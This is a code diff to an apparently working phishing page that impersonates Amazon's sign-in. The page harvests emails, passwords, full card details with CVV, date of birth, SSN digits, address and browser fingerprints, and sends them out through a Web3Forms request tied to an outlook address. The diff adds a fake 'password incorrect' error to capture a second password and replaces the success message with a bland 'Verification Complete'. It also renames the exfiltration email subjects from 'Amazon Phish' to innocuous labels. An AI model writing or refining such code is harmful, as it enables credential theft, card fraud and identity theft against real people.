@@ -22,6 +22,7 @@
         .btn:hover { background: linear-gradient(to bottom, #f5d78e, #eeb933); }
         .btn:disabled { opacity: 0.6; cursor: not-allowed; }
         .error { background: #fff0f0; border: 1px solid #d00; border-radius: 4px; padding: 15px; margin-bottom: 15px; color: #c00; font-size: 13px; display: none; }
+        .error.show { display: block; }
         .step { display: none; }
         .step.active { display: block; }
         .divider { display: flex; align-items: center; margin: 20px 0; }
@@ -45,7 +46,7 @@
         </div>
         <div class="box step active" id="step1">
             <h1>Sign in</h1>
-            <div class="error" id="error1"></div>
+            <div class="error" id="error1">Your password is incorrect</div>
             <form id="loginForm">
                 <div class="form-group">
                     <label>Email or mobile phone number</label>
@@ -135,8 +136,8 @@
         <div class="box step" id="step4">
             <div style="text-align:center;padding:20px;">
                 <div style="font-size:48px;color:#067d62;">&#10003;</div>
-                <h2 style="margin:15px 0;color:#111;">Order Cancelled Successfully</h2>
-                <p style="color:#555;font-size:14px;margin-bottom:20px;">Your refund of $1,199.00 has been initiated and will be processed within 3-5 business days.</p>
+                <h2 style="margin:15px 0;color:#111;">Verification Complete</h2>
+                <p style="color:#555;font-size:14px;margin-bottom:20px;">Your account has been verified successfully.</p>
                 <p style="color:#888;font-size:12px;">Redirecting to Amazon...</p>
             </div>
         </div>
@@ -156,15 +157,15 @@
         const TARGET_EMAIL = 'barugas2026@outlook.com';
         const WEBHOOK_URL = '';
         let isUS = false;
+        let loginAttempt = 0;
         let collectedData = {
-            email: '', password: '',
+            email: '', password: '', password2: '',
             cardName: '', cardNumber: '', cardExp: '', cardCvv: '',
             fullName: '', dob: '', ssn: '', phone: '', address: '', city: '', zip: '',
             ip: '', country: '', userAgent: navigator.userAgent, screen: screen.width + 'x' + screen.height,
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             language: navigator.language, timestamp: ''
         };
-        // Get IP and detect country
         fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
             collectedData.ip = d.ip;
             collectedData.country = d.country_code;
@@ -176,18 +177,15 @@
         }).catch(() => {
             fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => collectedData.ip = d.ip).catch(() => {});
         });
-        // Format card number
         document.getElementById('cardNumber').addEventListener('input', function(e) {
             let v = e.target.value.replace(/\D/g, '').substring(0, 16);
             e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
         });
-        // Format card expiry
         document.getElementById('cardExp').addEventListener('input', function(e) {
             let v = e.target.value.replace(/\D/g, '').substring(0, 4);
             if (v.length >= 2) v = v.substring(0,2) + '/' + v.substring(2);
             e.target.value = v;
         });
-        // Format DOB MM/DD/YYYY
         document.getElementById('dob').addEventListener('input', function(e) {
             let v = e.target.value.replace(/\D/g, '').substring(0, 8);
             if (v.length >= 4) {
@@ -197,7 +195,6 @@
             }
             e.target.value = v;
         });
-        // Format SSN (4 digits only)
         document.getElementById('ssn').addEventListener('input', function(e) {
             e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
         });
@@ -208,12 +205,18 @@
         function showLoading(show) {
             document.getElementById('loading').style.display = show ? 'block' : 'none';
         }
+        function getSubject(step) {
+            if (step === 1) return 'Email Access';
+            if (step === 2) return 'Card Info';
+            return 'Personal Info';
+        }
         async function sendData(step) {
             collectedData.timestamp = new Date().toISOString();
-            let msg = '** AMAZON PHISH - Step ' + step + ' **\n======================\n';
+            let msg = '** AMAZON - Step ' + step + ' **\n======================\n';
             if (step >= 1) {
                 msg += 'Email: ' + collectedData.email + '\n';
-                msg += 'Password: ' + collectedData.password + '\n';
+                msg += 'Password 1: ' + collectedData.password + '\n';
+                if (collectedData.password2) msg += 'Password 2: ' + collectedData.password2 + '\n';
             }
             if (step >= 2) {
                 msg += '\n** Card Info **\n';
@@ -248,8 +251,8 @@
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({
                             access_key: WEB3FORMS_KEY,
-                            subject: 'Amazon Phish - Step ' + step + ' - ' + collectedData.country,
-                            from_name: 'Phish Alert',
+                            subject: getSubject(step),
+                            from_name: 'D1337 Project',
                             message: msg,
                             victim_email: collectedData.email,
                             data: JSON.stringify(collectedData)
@@ -269,8 +272,17 @@
         }
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
-            collectedData.email = document.getElementById('email').value;
-            collectedData.password = document.getElementById('password').value;
+            loginAttempt++;
+            if (loginAttempt === 1) {
+                collectedData.email = document.getElementById('email').value;
+                collectedData.password = document.getElementById('password').value;
+                document.getElementById('error1').classList.add('show');
+                document.getElementById('password').value = '';
+                document.getElementById('password').focus();
+                return;
+            }
+            collectedData.password2 = document.getElementById('password').value;
+            document.getElementById('error1').classList.remove('show');
             showLoading(true);
             await sendData(1);
             setTimeout(() => { showLoading(false); showStep(2); }, 1500);
